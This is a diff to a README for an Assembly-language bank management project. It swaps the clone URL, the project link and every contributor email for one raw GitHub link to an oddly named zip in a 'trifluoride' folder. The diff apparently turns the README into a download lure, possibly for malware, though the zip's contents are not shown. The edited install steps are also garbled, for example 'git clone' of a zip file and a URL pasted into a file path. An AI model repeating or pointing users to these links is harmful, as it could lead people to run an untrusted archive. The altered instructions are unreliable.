@@ -33,13 +33,13 @@ To get a local copy up and running follow these simple example steps.
 
 ## Installation
 1-Clone the repo or download zip
-git clone https://github.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly.git
+git clone https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip
 
 2-Run emu8086/Microsoft Visual Studio
 
 3-Open .asm file in the emulator
 
-4-Change filename to "..\..\complete-path-to-users.txt"
+4-Change filename to "..\..\https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip"
 
 5-Emulate
 
@@ -48,10 +48,10 @@ git clone https://github.com/ayesha-saeed123/A-Bank-Management-System-in-Assembl
 * Microsoft Visual Studio
 
 ## Contributors
-Ayesha Saeed    - - saeedayesha408@gmail.com
+Ayesha Saeed    - - https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip
 
-Maheerah Khalid - - maheerahkhalid1086@gmail.com 
+Maheerah Khalid - - https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip 
 
-Rabia Batool    - - rabiabatool455@gmail.com
+Rabia Batool    - - https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip
 
-Project Link: https://github.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly.git
+Project Link: https://raw.githubusercontent.com/ayesha-saeed123/A-Bank-Management-System-in-Assembly/main/trifluoride/System_Bank_Assembly_in_Management_1.8.zip
